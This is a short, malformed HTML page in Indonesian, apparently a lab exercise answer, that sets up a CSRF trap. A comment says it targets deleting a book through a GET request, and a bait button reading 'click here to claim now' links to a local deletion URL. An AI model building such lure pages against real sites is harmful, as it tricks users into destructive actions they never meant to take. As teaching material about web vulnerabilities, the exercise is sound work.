<!DOCTYPE html>
<html lang="id">
<head>

            display: inline-block;
            background: white;
            padding: 40px;

<body>
    <div class="box">

        <!-- Tautan jebakan CSRF Soal 1 (A3) menargetkan penghapusan buku via GET request -->
        <a href="http://127.0.0.1:8000/buku/1/hapus" class="btn">KLIK DI SINI UNTUK KLAIM SEKARANG</a>
    </div>

</html>
